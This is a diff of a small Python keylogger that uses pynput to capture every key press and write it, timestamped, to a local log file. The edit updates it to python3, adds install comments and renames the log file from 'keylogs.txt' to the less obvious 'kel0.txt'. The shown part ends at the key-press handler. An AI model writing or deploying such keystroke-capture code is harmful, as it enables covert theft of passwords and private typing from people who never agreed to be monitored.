@@ -1,12 +1,13 @@
-#!/usr/bin/python
+#!/usr/bin/python3
+# install requirements first from requirements.txt file
+# pip install -r requirements.txt
 
 from pynput.keyboard import Key, Listener
 import logging
 
 log_dir = ""
 
-logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
-	level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename=(log_dir + "kel0.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
     logging.info(str(key))
